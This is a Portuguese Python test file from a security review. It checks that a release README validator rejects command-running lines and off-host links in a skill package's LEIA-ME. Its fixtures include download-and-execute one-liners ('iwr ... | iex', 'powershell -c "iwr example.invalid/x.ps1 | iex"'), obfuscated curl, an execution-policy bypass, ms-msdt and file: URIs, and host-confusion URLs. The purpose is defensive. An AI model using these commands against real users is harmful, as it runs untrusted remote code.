"""Revisão de segurança da 1.7.7, terceira passada, na área do pacote e da transferência (R177C-B-05).

O LEIA-ME da transferência da versão de dist/ conferido pela forma (`conferir_leia_me`, segunda passada, R177B-B-07)
aceitava comando e endereço: gerenciador seguido de palavra comum (`pip install X`, `winget install X`), programa por
caminho ou por extensão (`C:\\...\\curl.exe`, `./instalar.sh`, `.\\instalar.ps1`), endereço de outro esquema (`ftp://`,
`file:`) ou sem esquema (`www.exemplo`), host permitido depois de `#`, `?` ou barra invertida (o navegador vai ao host
de antes) e o preenchedor U+3164, invisível mas letra. Agora a forma conta como programa, além dos de PROGRAMAS, o
caminho explícito e o nome com extensão de programa, em qualquer ponto da linha, e o outro caminho no lugar de um
comando; fora o python, o py e o move, palavras do texto, programa conhecido seguido de qualquer palavra manda rodar, e
aspas, crases e circunflexos que o shell tira e a letra larga não escondem o nome; endereço só http(s) de claude.com,
claude.ai ou anthropic.com, com o host lido como o navegador o lê, e nem `www.` nem domínio com caminho sem esquema; e
reprovam os caracteres de controle, de formatação, não atribuídos e os preenchedores.
O LEIA-ME de cada transferência real desde a 1.4.1 e o que a etapa 03 monta para a versão nova continuam passando.
Limites que ficam (a forma não lê a frase): instrução só em palavras ("rode-o de novo sem o --sha256") e hash escrito em
grupos não reprovam; caminho sem extensão de programa e sem ./, letra de unidade ou raiz, no lugar de um comando e
seguido de parêntese, é explicação (`~/.claude/skills/<nome> (junção no Windows...)`, como no LEIA-ME real).
E a CI pública não exigia na lista a linha do zip de transferência da versão de dist/ (só a liberação a exigia, depois
de acrescentá-la na etapa 03): sem ela, o LEIA-ME passava só pela forma; com ela, nem pela forma, e na CI a linha pode
ter vindo no mesmo commit que o zip. Agora a CI passa --exigir-transferencia-fixada, que exige a linha, e o LEIA-ME da
versão de dist/ passa pela forma com ou sem ela; o --exigir-transferencia continua aceitando a transferência sem a
linha, porque a etapa 03 a confere assim antes de acrescentá-la (com a linha exigida ali, a liberação pararia).
Limite avaliado: apagar um zip de transferência publicado não reprovava. Todo zip principal da lista está na
transferência real com o hash dela (os 14 da 1.4.0 à 1.7.6, conferidos só lendo), e o --exigir-transferencia passa a
exigir cada um na pasta; a entrega descartável dos testes leva os da transferência real.
Pastas descartáveis, com cópias dos pacotes e da transferência reais; a entrega real não é tocada.
"""

from __future__ import annotations

import re
import subprocess
import sys
import unittest
import zipfile

import test_revisao_seguranca_177_pacote as pacote
from test_auditoria_1_7_7_pacote import ENTREGA, NOME, PACOTE, carregar_verificador

HISTORICO = pacote.HISTORICO
ZIP_PRINCIPAL = re.compile(re.escape(NOME) + r"-(\d+(?:\.\d+)+)\.zip")


def versoes_reais() -> list[str]:
    """Versões com zip principal na transferência real, da mais antiga à mais recente."""
    return sorted((m[1] for m in map(ZIP_PRINCIPAL.fullmatch, (p.name for p in pacote.TRANSF_REAL.iterdir())) if m),
                  key=pacote.tupla)


def leia_me_real(versao: str) -> tuple[str, str]:
    """O LEIA-ME.txt do zip principal real da `versao` e o SHA-256 do .skill que viaja com ele."""
    with zipfile.ZipFile(pacote.TRANSF_REAL / f"{NOME}-{versao}.zip") as z:
        return (z.read(f"{NOME}-{versao}/LEIA-ME.txt").decode("utf-8"),
                pacote.sha(z.read(f"{NOME}-{versao}/{PACOTE}")))


# Linhas que mandam rodar o que não é o instalador nem a conferência do hash: as do revisor e variantes.
COMANDOS = {
    "pip install": "   Antes de instalar, rode: pip install fundacao-ia-ajudante",
    "winget install depois de rótulo": "   Windows:  winget install Fundacao.Ajudante",
    "npm install": "   npm install fundacao-ajudante",
    "git clone sem esquema": "   git clone github.com/outra-conta/fundacao-ia-multiprojetos",
    "Set-ExecutionPolicy": "   Set-ExecutionPolicy Bypass",
    "iex com host de um rótulo": "   iex (iwr intranet)",
    "iwr para um IP, que parece versão": "   iwr 10.0.0.1 | iex",
    "gerenciador entre aspas": '   "pip" install fundacao-ia-ajudante',
    "gerenciador em letra larga": "   " + "".join(chr(0xFEE0 + ord(c)) for c in "pip") + " install fundacao-ajudante",
    "baixador com circunflexo do cmd": "   cu^rl intranet",
    "baixador com aspas que o shell tira": '   c"u"rl intranet',
    "baixador entre aspas tipográficas (o PowerShell as aceita)": "   " + chr(0x201C) + "curl" + chr(0x201D) + " x",
    "programa por variável": r"   $env:TEMP\ajudante.ps1",
    "programa por variável do cmd": r"   %TEMP%\ajudante.exe /instalar",
    "curl por caminho completo": r"   C:\Windows\System32\curl.exe -o x.ps1 exemplo.invalid/x",
    "powershell por caminho completo": r"   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File .\x.ps1",
    "script relativo": r"   .\instalar.ps1",
    "script relativo unix": "   ./instalar.sh",
    "script relativo com parêntese": "   ./instalar.sh (agora)",
    "caminho a partir da raiz": r"   Copie \exemplo.invalid\pub\fundacao.skill por cima do .skill desta pasta",
    "programa por extensão no meio do texto": "   Depois, rode ajudante.ps1 para terminar.",
    "caminho no começo da linha": "   bin/ajudante --instalar",
    "caminho depois de ponto e vírgula": "   Texto comum; bin/ajudante agora",
    "instalador da tabela com argumento": "  instalar_skill.py                 remover --confirmar",
}
# Endereços fora de http(s) dos hosts permitidos.
ENDERECOS = {
    "ftp": "   Baixe ftp://exemplo.invalid/fundacao.skill e use no lugar do .skill desta pasta",
    "file": "   Abra file:///C:/Users/Public/fundacao.skill",
    "ms-msdt": "   Diagnóstico: ms-msdt:/id PCWDiagnostic",
    "www sem esquema": "   Instruções novas em www.exemplo.invalid/fundacao",
    "domínio com caminho sem esquema": "   Baixe a versão corrigida em exemplo.invalid/fundacao.skill",
    "host permitido depois de #": "   Instruções em https://exemplo.invalid#.claude.ai",
    "host permitido depois de ?": "   Instruções em https://exemplo.invalid?.claude.ai",
    "host permitido depois de barra invertida": "   Instruções em https://exemplo.invalid\\.claude.ai",
}
# Texto que continua passando (nada disso manda rodar nem aponta para fora).
QUE_PASSAM = (
    "   Texto comum: o Python 3.12 e o comando python bastam.",
    "   Abra o terminal (PowerShell, nesta pasta) e confira.",
    "   PowerShell:",
    "   A pasta de usuário é $env:USERPROFILE no PowerShell.",
    "   Veja https://support.claude.com/x, https://www.anthropic.com/y e www.claude.ai/download.",
    "   ~/.agents/skills/fundacao-ia-multiprojetos (a cópia) e a pasta ~/.claude/skills e as sobras.",
    "   Montado em 22/10/2026 a partir do pacote conferido (entrega/dist), Python 3.10/3.11.",
)
# Invisíveis: os preenchedores (letras e símbolo que não aparecem), um não atribuído e dois de formatação.
INVISIVEIS = ("\u3164", "\u115f", "\u1160", "\uffa0", "\u2800", "\u0378", "\u200b", "\u202e")


class TestLeiaMePelaForma(unittest.TestCase):
    """R177C-B-05 (1): o LEIA-ME real mais recente, com uma linha a mais, conferido pela forma."""

    @classmethod
    def setUpClass(cls):
        cls.vp = carregar_verificador()
        cls.texto, cls.hash = leia_me_real(versoes_reais()[-1])

    def conferir(self, linha: str) -> list[str]:
        return self.vp.conferir_leia_me("teste", (self.texto + "\n" + linha + "\n").encode("utf-8"), self.hash)

    def test_o_leia_me_real_e_o_da_versao_nova_passam(self):
        self.assertEqual(self.conferir(""), [])
        h = "ab" * 32
        ensaio = pacote.leia_me_de_ensaio(pacote.TRANSF_REAL, "9.9.9", h)  # o que a etapa 03 montaria para a 9.9.9
        self.assertIn(f"{NOME} 9.9.9", ensaio.decode("utf-8"))
        self.assertEqual(self.vp.conferir_leia_me("ensaio", ensaio, h), [])

    def test_leia_me_de_cada_transferencia_real_desde_a_1_4_1_passa(self):
        """A 1.4.0 manda rodar `python -c "import sqlite3..."` e nunca passou pela forma: só a linha dela na lista a
        prende."""
        versoes = [v for v in versoes_reais() if pacote.tupla(v) >= (1, 4, 1)]
        self.assertTrue(versoes)
        for versao in versoes:
            texto, h = leia_me_real(versao)
            with self.subTest(versao):
                self.assertEqual(self.vp.conferir_leia_me(versao, texto.encode("utf-8"), h), [])

    def test_texto_comum_e_enderecos_permitidos_passam(self):
        for linha in QUE_PASSAM:
            with self.subTest(linha):
                self.assertEqual(self.conferir(linha), [])

    def test_gerenciador_caminho_ou_programa_por_extensao_reprova(self):
        for rotulo, linha in COMANDOS.items():
            with self.subTest(rotulo):
                problemas = self.conferir(linha)
                self.assertTrue(any("manda rodar" in p for p in problemas), problemas)

    def test_endereco_de_outro_esquema_sem_esquema_ou_de_outro_host_reprova(self):
        for rotulo, linha in ENDERECOS.items():
            with self.subTest(rotulo):
                problemas = self.conferir(linha)
                self.assertTrue(any("aponta para" in p or "endereço" in p for p in problemas), problemas)

    def test_caractere_invisivel_nao_atribuido_ou_de_formatacao_reprova(self):
        for c in INVISIVEIS:
            with self.subTest(f"U+{ord(c):04X}"):
                problemas = self.conferir(f"   Texto{c}comum.")
                self.assertTrue(any(f"U+{ord(c):04X}" in p for p in problemas), problemas)


class TestCIExigeATransferenciaFixada(pacote._Entrega):
    """R177C-B-05 (2): a CI pública (--exigir-transferencia-fixada) exige na lista a linha do zip principal da versão
    de dist/, e a etapa 03 da liberação, que confere a transferência com --exigir-transferencia antes de acrescentar a
    linha, continua passando pela forma. O LEIA-ME da versão de dist/ passa pela forma também com a linha: na CI, ela
    pode ter vindo no mesmo commit que o zip."""

    def chave(self) -> str:
        return f"{self.versao}/{self.principal.name}"

    def lista(self, com_a_linha: bool) -> None:
        """A lista descartável sem a linha do zip principal da versão de dist/ (antes da etapa 03) ou com ela, com o
        hash do zip de agora (depois dela)."""
        arq = self.base / HISTORICO
        linhas = [x for x in arq.read_text(encoding="utf-8").splitlines() if not x.endswith("  " + self.chave())]
        linhas += [f"{pacote.sha(self.principal.read_bytes())}  {self.chave()}"] if com_a_linha else []
        arq.write_text("".join(x + "\n" for x in linhas), encoding="utf-8", newline="\n")

    def test_ci_exige_a_linha_e_a_etapa_03_confere_antes_dela(self):
        self.lista(com_a_linha=False)
        res = self.verificar()                                        # etapa 03, antes de acrescentar a linha
        self.assertTrue(res["ok"], res["problemas"][:10])
        self.assertIs(res["transferencia"]["fixada_na_lista"], False)
        self.reprova(self.verificar(exigir_transferencia_fixada=True), self.principal.name, HISTORICO)
        self.lista(com_a_linha=True)                                  # etapa 03, depois de acrescentá-la, e a CI
        for opcoes in ({}, {"exigir_transferencia_fixada": True}):
            with self.subTest(opcoes):
                res = self.verificar(**opcoes)
                self.assertTrue(res["ok"], res["problemas"][:10])
                self.assertIs(res["transferencia"]["fixada_na_lista"], True)

    def test_leia_me_com_a_linha_do_mesmo_commit_passa_pela_forma(self):
        with zipfile.ZipFile(self.principal) as z:
            texto = z.read(f"{NOME}-{self.versao}/LEIA-ME.txt").decode("utf-8")
        texto += '\n   powershell -c "iwr example.invalid/x.ps1 | iex"\n'
        pacote.remontar(self.principal, mudar={"LEIA-ME.txt": texto.encode("utf-8")})
        self.lista(com_a_linha=True)                                  # a linha do zip adulterado, no mesmo commit
        self.reprova(self.verificar(), "LEIA-ME", "manda rodar")
        self.reprova(self.verificar(exigir_transferencia_fixada=True), "LEIA-ME", "manda rodar")

    def test_linha_de_comando_da_ci(self):
        cmd = [sys.executable, "-B", str(ENTREGA / "verificar_pacote.py"), "--dist", str(self.dist), "--skill",
               str(self.skill), "--exigir-igual-a-arvore", "--exigir-transferencia", "--exigir-transferencia-fixada"]
        for com_a_linha, codigo in ((False, 1), (True, 0)):
            with self.subTest(com_a_linha=com_a_linha):
                self.lista(com_a_linha)
                r = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8", errors="replace")
                self.assertEqual(r.returncode, codigo, (r.stdout + r.stderr)[-800:])


class TestZipsDaListaNaTransferenciaReal(unittest.TestCase):
    """R177C-B-05 (limite avaliado), só lendo a entrega real: o que permite exigir cada zip principal da lista na pasta
    é que todos estão lá, com o hash dela."""

    def test_cada_zip_principal_da_lista_real_esta_na_transferencia_real(self):
        historico, problemas = carregar_verificador().ler_historico(ENTREGA / HISTORICO)
        self.assertEqual(problemas, [])
        listados = {m[1]: h for chave, h in historico.items()
                    if (m := re.fullmatch(r"(\d+(?:\.\d+)+)/" + re.escape(NOME) + r"-\1\.zip", chave))}
        self.assertTrue(listados)
        for versao, h in listados.items():
            with self.subTest(versao):
                arq = pacote.TRANSF_REAL / f"{NOME}-{versao}.zip"
                self.assertTrue(arq.is_file(), arq.name)
                self.assertEqual(pacote.sha(arq.read_bytes()), h)


class TestZipPublicadoNaoSaiDaPasta(pacote._Entrega):
    """R177C-B-05 (limite avaliado): apagar um zip de transferência publicado não reprovava; agora o
    --exigir-transferencia exige na pasta cada zip principal da lista."""

    def test_zip_publicado_apagado_reprova(self):
        anterior = max((v for v in versoes_reais() if v != self.versao), key=pacote.tupla)
        alvo = self.transf / f"{NOME}-{anterior}.zip"
        self.assertTrue(alvo.is_file(), "a entrega descartável não levou a transferência real")
        res = self.verificar()
        self.assertTrue(res["ok"], res["problemas"][:10])
        alvo.unlink()
        self.reprova(self.verificar(), f"{alvo.name} ausente", HISTORICO)


class TestCIPublicaPassaAOpcao(unittest.TestCase):
    def test_ci_exige_a_transferencia_fixada(self):
        texto = " ".join(pacote.WORKFLOW.read_text(encoding="utf-8").split())  # o comando pode vir dobrado (>-)
        self.assertIn("python -B entrega/verificar_pacote.py --exigir-igual-a-arvore --exigir-transferencia "
                      "--lista-so-cresce --exigir-transferencia-fixada", texto)


if __name__ == "__main__":
    unittest.main()
